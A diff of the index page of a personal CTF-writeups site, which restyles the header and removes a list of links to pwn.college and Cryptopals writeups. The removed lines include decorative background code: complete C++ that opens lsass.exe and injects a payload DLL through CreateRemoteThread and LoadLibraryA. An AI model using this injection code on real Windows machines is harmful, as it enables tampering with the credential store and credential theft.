@@ -15,955 +15,1765 @@
     <link rel="stylesheet" href="/assets/css/style.css">
 </head>
 <body>
-    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
-    <div id="bg-code-layer" aria-hidden="true">
-#include &lt;windows.h&gt;
-#include &lt;iostream&gt;
-#include &lt;tlhelp32.h&gt;
-
-// Internal structures for PEB and API Hooking
-typedef struct _UNICODE_STRING {
-    USHORT Length;
-    USHORT MaximumLength;
-    PWSTR  Buffer;
-} UNICODE_STRING, *PUNICODE_STRING;
-
-DWORD FindProcessId(const std::wstring& processName) {
-    PROCESSENTRY32 processInfo;
-    processInfo.dwSize = sizeof(processInfo);
-
-    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
-    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
-
-    Process32First(processesSnapshot, &processInfo);
-    if (!processName.compare(processInfo.szExeFile)) {
-        CloseHandle(processesSnapshot);
-        return processInfo.th32ProcessID;
-    }
-
-    while (Process32Next(processesSnapshot, &processInfo)) {
-        if (!processName.compare(processInfo.szExeFile)) {
-            CloseHandle(processesSnapshot);
-            return processInfo.th32ProcessID;
-        }
-    }
-
-    CloseHandle(processesSnapshot);
-    return 0;
-}
-
-int main() {
-    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
-    DWORD processId = FindProcessId(L"lsass.exe");
-
-    if (!processId) {
-        std::cerr << "[-] Target process not found." << std::endl;
-        return 1;
-    }
-
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
-    if (!hProcess) {
-        std::cerr << "[-] Failed to open process." << std::endl;
-        return 1;
-    }
-
-    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
-    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
-
-    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
-        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
-        pDllPath, 0, 0);
-
-    WaitForSingleObject(hLoadThread, INFINITE);
-    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
-    CloseHandle(hLoadThread);
-    CloseHandle(hProcess);
-
-    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
-    return 0;
-}
+    <!-- Subtle Hexdump Background to mimic RE tool -->
+    <div class="bg-hexdump" aria-hidden="true">
+00000000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|
+00000010  03 00 3e 00 01 00 00 00  60 10 40 00 00 00 00 00  |..>.....`.@.....|
+00000020  40 00 00 00 00 00 00 00  48 30 00 00 00 00 00 00  |@.......H0......|
+00000030  00 00 00 00 40 00 38 00  09 00 40 00 1a 00 19 00  |....@.8...@.....|
+00000040  06 00 00 00 04 00 00 00  40 00 00 00 00 00 00 00  |........@.......|
+00000050  40 00 40 00 00 00 00 00  40 00 40 00 00 00 00 00  |@.@.....@.@.....|
+00000060  f8 01 00 00 00 00 00 00  f8 01 00 00 00 00 00 00  |................|
+00000070  08 00 00 00 00 00 00 00  03 00 00 00 04 00 00 00  |................|
+00000080  38 02 00 00 00 00 00 00  38 02 40 00 00 00 00 00  |8.......8.@.....|
+00000090  38 02 40 00 00 00 00 00  1c 00 00 00 00 00 00 00  |8.@.............|
+000000a0  1c 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00  |................|
+000000b0  01 00 00 00 05 00 00 00  00 00 00 00 00 00 00 00  |................|
+000000c0  00 00 40 00 00 00 00 00  00 00 40 00 00 00 00 00  |..@.......@.....|
+000000d0  e4 08 00 00 00 00 00 00  e4 08 00 00 00 00 00 00  |................|
+000000e0  00 10 00 00 00 00 00 00  01 00 00 00 06 00 00 00  |................|
+000000f0  e8 0d 00 00 00 00 00 00  e8 0d 60 00 00 00 00 00  |........`.@.....|
+00000100  e8 0d 60 00 00 00 00 00  48 02 00 00 00 00 00 00  |..`.....H.......|
+00000110  50 02 00 00 00 00 00 00  00 10 00 00 00 00 00 00  |P...............|
+00000120  02 00 00 00 06 00 00 00  08 0e 00 00 00 00 00 00  |................|
+00000130  08 0e 60 00 00 00 00 00  08 0e 60 00 00 00 00 00  |..`.......`.....|
+00000140  f0 01 00 00 00 00 00 00  f0 01 00 00 00 00 00 00  |................|
+00000150  08 00 00 00 00 00 00 00  04 00 00 00 04 00 00 00  |................|
+00000160  54 02 00 00 00 00 00 00  54 02 40 00 00 00 00 00  |T.......T.@.....|
+00000170  54 02 40 00 00 00 00 00  44 00 00 00 00 00 00 00  |T.@.....D.......|
+00000180  44 00 00 00 00 00 00 00  04 00 00 00 00 00 00 00  |D...............|
+00000190  51 e5 74 64 06 00 00 00  00 00 00 00 00 00 00 00  |Q.td............|
+000001a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+000001b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+000001c0  08 00 00 00 00 00 00 00  52 e5 74 64 04 00 00 00  |........R.td....|
+000001d0  e8 0d 00 00 00 00 00 00  e8 0d 60 00 00 00 00 00  |........`.@.....|
     </div>
 
-    <div class="glow-orb-1"></div>
-    <div class="glow-orb-2"></div>
-
     <header>
-        <div class="container">
-            <a href="/" class="site-title">KAAAMMUUI</a>
+        <div class="page-container">
+            <a href="/" class="site-wordmark">0xKAAAMMUUI</a>
             <nav>
-                <a href="/" >Home</a>
-                <a href="/projects/" >Projects</a>
-                <a href="/game-modding/" >Game Modding</a>
-                <a href="/writeups/" class="active">CTF Writeups</a>
-                <a href="/notes/" >Notes</a>
+                <a href="/" >0x0000 [.text] Home</a>
+                <a href="/writeups/" class="active">0x1000 [.data] Writeups</a>
+                <a href="/game-modding/" >0x2000 [.ro] Game Mods</a>
+                <a href="/notes/" >0x3000 [.bss] Notes</a>
             </nav>
         </div>
     </header>
 
-    <main>
-        <div class="container">
-    <h1 style="margin-bottom: 0.5rem;">Capture the Flag Walkthroughs</h1>
-    <p style="margin-bottom: 3rem;">Detailed technical walkthroughs focusing on binary exploitation and reverse engineering.</p>
-
-    <h1 style="margin-bottom: 0.5rem; color: var(--accent-cyan); font-family: var(--font-mono); font-size: 2.5rem;">Platforms</h1>
-    <p style="margin-bottom: 3rem;">Writeups mapping directly to educational platform modules.</p>
-
-    
-    
-
-    
-        <h2 style="margin-top: 3rem; margin-bottom: 1.5rem; color: #fff; font-family: var(--font-mono); border-bottom: 1px solid var(--glass-border); padding-bottom: 0.5rem;">
-            // Cryptopals
-        </h2>
-
-        
-        
-        
-            <div class="grid" style="margin-top: 2rem; margin-bottom: 2rem;">
-                
-                    <div class="card">
-                        <h3 style="font-size: 1.2rem;">Code</h3>
-                        <a href="/writeups/chall1-code/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                    </div>
-                
-                    <div class="card">
-                        <h3 style="font-size: 1.2rem;">Code</h3>
-                        <a href="/writeups/chall2-code/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                    </div>
-                
-                    <div class="card">
-                        <h3 style="font-size: 1.2rem;">--------------------------------------------------</h3>
-                        <a href="/writeups/chall3-code/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                    </div>
-                
-                    <div class="card">
-                        <h3 style="font-size: 1.2rem;">Code</h3>
-                        <a href="/writeups/chall4-code/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                    </div>
-                
-                    <div class="card">
-                        <h3 style="font-size: 1.2rem;">Code</h3>
-                        <a href="/writeups/chall5-code/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                    </div>
-                
-            </div>
-        
-    
-        <h2 style="margin-top: 3rem; margin-bottom: 1.5rem; color: #fff; font-family: var(--font-mono); border-bottom: 1px solid var(--glass-border); padding-bottom: 0.5rem;">
-            // pwn.college
-        </h2>
-
-        
-        
-        
-            
-            
-                <h3 style="margin-top: 2rem; margin-bottom: 1.5rem; color: var(--text-muted); font-size: 1.3rem;">
-                    <span style="color: var(--accent-purple);">-></span> Cryptography <span style="font-size: 0.9rem;">[7 Writeups]</span>
-                </h3>
-                <div class="grid" style="margin-bottom: 2rem;">
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🧠 XOR 101 — Intro to Bitwise Crypto</h3>
-                            <a href="/writeups/cryptography-01-xor/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🔐 XORing Hex — Practice XOR with Hex Values</h3>
-                            <a href="/writeups/cryptography-02-xoring-hex/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🔤 XORing ASCII — XORing Characters Byte by Byte</h3>
-                            <a href="/writeups/cryptography-03-xoring-ascii/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🔡 XORing ASCII Strings — Full-String XOR Practice</h3>
-                            <a href="/writeups/cryptography-04-xoring-ascii-strings/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🔐 One-Time Pad Decryption</h3>
-                            <a href="/writeups/cryptography-05-one-time-padding/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🔐 One-Time Pad Tampering — Integrity Flaw Exploit</h3>
-                            <a href="/writeups/cryptography-06-one-time-pad-tamper/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🧠 Many-time Pad — Cryptography Challenge Writeup</h3>
-                            <a href="/writeups/cryptography-07-many-time-pad/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                </div>
-            
-                <h3 style="margin-top: 2rem; margin-bottom: 1.5rem; color: var(--text-muted); font-size: 1.3rem;">
-                    <span style="color: var(--accent-purple);">-></span> Intercepting Communication <span style="font-size: 0.9rem;">[29 Writeups]</span>
-                </h3>
-                <div class="grid" style="margin-bottom: 2rem;">
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🌐 Connect – Writeup (pwn.college)</h3>
-                            <a href="/writeups/intercepting-communication-01-connect/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🌐 Connect – Message Sending (pwn.college)</h3>
-                            <a href="/writeups/intercepting-communication-02-send/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🚩 Challenge: Shutdown</h3>
-                            <a href="/writeups/intercepting-communication-03-shutdown/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🔊 Challenge: Listen</h3>
-                            <a href="/writeups/intercepting-communication-04-listen/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🔍 Scan1 Challenge</h3>
-                            <a href="/writeups/intercepting-communication-05-scan1/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🛰️ Scan2 Challenge — pwn.college</h3>
-                            <a href="/writeups/intercepting-communication-06-scan1/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Monitor1 - Monitor Traffic from a Remote Host</h3>
-                            <a href="/writeups/intercepting-communication-07-monitor1/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🧪 Monitor2 Challenge – pwn.college</h3>
-                            <a href="/writeups/intercepting-communication-08-monitor2/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Cookie-Sniffer 🕵️‍♂️🍪</h3>
-                            <a href="/writeups/intercepting-communication-09-sniffing-cookies/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Network-Configuration 🌐🔧</h3>
-                            <a href="/writeups/intercepting-communication-10-network-configuration/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Firewall1 🔥🧱</h3>
-                            <a href="/writeups/intercepting-communication-11-firewall1/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Firewall2 🔥🧱🎯</h3>
-                            <a href="/writeups/intercepting-communication-12-firewall2/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Firewall3 🔥📤🧱</h3>
-                            <a href="/writeups/intercepting-communication-13-firewall3/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">📌 Challenge Summary</h3>
-                            <a href="/writeups/intercepting-communication-14-denial-of-service-1/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🧨 Challenge Writeup: `dos2`</h3>
-                            <a href="/writeups/intercepting-communication-15-denial-of-service-2/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Denial-of-service-3 — Writeup</h3>
-                            <a href="/writeups/intercepting-communication-16-denial-of-service-3/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">📡 Ethernet — pwn.college</h3>
-                            <a href="/writeups/intercepting-communication-17-ethernet/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🌐 Internet Protocol Packet — pwn.college</h3>
-                            <a href="/writeups/intercepting-communication-18-ip/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🔌 Transmission Control Protocol Packet — pwn.college</h3>
-                            <a href="/writeups/intercepting-communication-19-tcp/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🤝 TCP Three-Way Handshake — pwn.college</h3>
-                            <a href="/writeups/intercepting-communication-20-tcp-handshake/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🛰️ UDP Challenge – 'First UDP Interaction'</h3>
-                            <a href="/writeups/intercepting-communication-21-udp/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">📡 UDP2 – 'Set the Source Port'</h3>
-                            <a href="/writeups/intercepting-communication-22-udp2/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">✅ UDP-Spoofing-1 Challenge</h3>
-                            <a href="/writeups/intercepting-communication-23-udp-spoofing-1/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🛰️ UDP-spoofing-2 (pwn.college)</h3>
-                            <a href="/writeups/intercepting-communication-24-udp-spoofing-2/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🛰️ UDP Spoofing 3 – Writeup (pwn.college)</h3>
-                            <a href="/writeups/intercepting-communication-25-udp-spoofing-3/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🛰️ UDP Spoofing 4 – Writeup (pwn.college)</h3>
-                            <a href="/writeups/intercepting-communication-26-udp-spoofing-4/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🧠 CTF Writeup: Manual ARP Packet Injection</h3>
-                            <a href="/writeups/intercepting-communication-27-arp/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🛰️ Intercept – Writeup (pwn.college)</h3>
-                            <a href="/writeups/intercepting-communication-28-intercept/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🕵️‍♂️ Man-in-the-Middle – Writeup (pwn.college)</h3>
-                            <a href="/writeups/intercepting-communication-29-mitm/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                </div>
-            
-                <h3 style="margin-top: 2rem; margin-bottom: 1.5rem; color: var(--text-muted); font-size: 1.3rem;">
-                    <span style="color: var(--accent-purple);">-></span> Program Misuse <span style="font-size: 0.9rem;">[49 Writeups]</span>
-                </h3>
-                <div class="grid" style="margin-bottom: 2rem;">
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: cat</h3>
-                            <a href="/writeups/program-misuse-01-cat/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: more</h3>
-                            <a href="/writeups/program-misuse-02-more/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: less</h3>
-                            <a href="/writeups/program-misuse-03-less/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: tail</h3>
-                            <a href="/writeups/program-misuse-04-tail/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: head</h3>
-                            <a href="/writeups/program-misuse-05-head/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: sort</h3>
-                            <a href="/writeups/program-misuse-06-sort/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: vim</h3>
-                            <a href="/writeups/program-misuse-07-vim/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: emacs</h3>
-                            <a href="/writeups/program-misuse-08-emacs/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: nano</h3>
-                            <a href="/writeups/program-misuse-09-nano/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: rev</h3>
-                            <a href="/writeups/program-misuse-10-rev/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: od</h3>
-                            <a href="/writeups/program-misuse-11-od/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: hd</h3>
-                            <a href="/writeups/program-misuse-12-hd/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: xxd</h3>
-                            <a href="/writeups/program-misuse-13-xxd/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: base32</h3>
-                            <a href="/writeups/program-misuse-14-base32/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: base64</h3>
-                            <a href="/writeups/program-misuse-15-base64/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: split</h3>
-                            <a href="/writeups/program-misuse-16-split/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: gzip</h3>
-                            <a href="/writeups/program-misuse-17-gzip/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: bzip2</h3>
-                            <a href="/writeups/program-misuse-18-bzip2/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: zip</h3>
-                            <a href="/writeups/program-misuse-19-zip/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: tar</h3>
-                            <a href="/writeups/program-misuse-20-tar/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: ar</h3>
-                            <a href="/writeups/program-misuse-21-ar/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: cpio</h3>
-                            <a href="/writeups/program-misuse-22-cpio/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: genisoimage</h3>
-                            <a href="/writeups/program-misuse-23-genisoimage/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: env</h3>
-                            <a href="/writeups/program-misuse-24-env/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: find</h3>
-                            <a href="/writeups/program-misuse-25-find/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: make</h3>
-                            <a href="/writeups/program-misuse-26-make/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: nice</h3>
-                            <a href="/writeups/program-misuse-27-nice/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: timeout</h3>
-                            <a href="/writeups/program-misuse-28-timeout/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: stdbuf</h3>
-                            <a href="/writeups/program-misuse-29-stdbuf/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: setarch</h3>
-                            <a href="/writeups/program-misuse-30-setarch/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: watch</h3>
-                            <a href="/writeups/program-misuse-31-watch/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: socat</h3>
-                            <a href="/writeups/program-misuse-32-socat/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: whiptail</h3>
-                            <a href="/writeups/program-misuse-33-whiptail/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: awk</h3>
-                            <a href="/writeups/program-misuse-34-awk/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: sed</h3>
-                            <a href="/writeups/program-misuse-35-sed/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: ed</h3>
-                            <a href="/writeups/program-misuse-36-ed/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: chown</h3>
-                            <a href="/writeups/program-misuse-37-chown/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: chmod</h3>
-                            <a href="/writeups/program-misuse-38-chmod/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: cp</h3>
-                            <a href="/writeups/program-misuse-39-cp/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: mv</h3>
-                            <a href="/writeups/program-misuse-40-mv/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: perl</h3>
-                            <a href="/writeups/program-misuse-41-perl/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: python</h3>
-                            <a href="/writeups/program-misuse-42-python/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: ruby</h3>
-                            <a href="/writeups/program-misuse-43-ruby/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: bash</h3>
-                            <a href="/writeups/program-misuse-44-bash/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: date</h3>
-                            <a href="/writeups/program-misuse-45-date/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: wc</h3>
-                            <a href="/writeups/program-misuse-47-wc/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: gcc</h3>
-                            <a href="/writeups/program-misuse-48-gcc/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: as</h3>
-                            <a href="/writeups/program-misuse-49-as/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge Name: wget</h3>
-                            <a href="/writeups/program-misuse-50-wget/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                </div>
-            
-                <h3 style="margin-top: 2rem; margin-bottom: 1.5rem; color: var(--text-muted); font-size: 1.3rem;">
-                    <span style="color: var(--accent-purple);">-></span> Web Security <span style="font-size: 0.9rem;">[27 Writeups]</span>
-                </h3>
-                <div class="grid" style="margin-bottom: 2rem;">
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🕵️‍♂️ Challenge: Path Traversal 1</h3>
-                            <a href="/writeups/web-security-01-path-traversal-1/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🕵️‍♂️ Challenge: Path Traversal 2</h3>
-                            <a href="/writeups/web-security-02-path-traversal-2/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Challenge: CDMi 1</h3>
-                            <a href="/writeups/web-security-03-cdmi1/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🧠 Challenge Name: CMDi-2</h3>
-                            <a href="/writeups/web-security-04-dsmi2/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">🧠 Challenge Name: CMDi-3</h3>
-                            <a href="/writeups/web-security-05-cdmi3/" class="view-btn" style="margin-top: 1rem;">Read More</a>
-                        </div>
-                    
-                        <div class="card">
-                            <h3 style="font-size: 1.2rem;">Command Injection 4 — Writeup</h3>
-                            <a href="/writeups/web-security-06-cdmi4/" class="view-btn" style="margin-top: 1rem;">Read More</a>
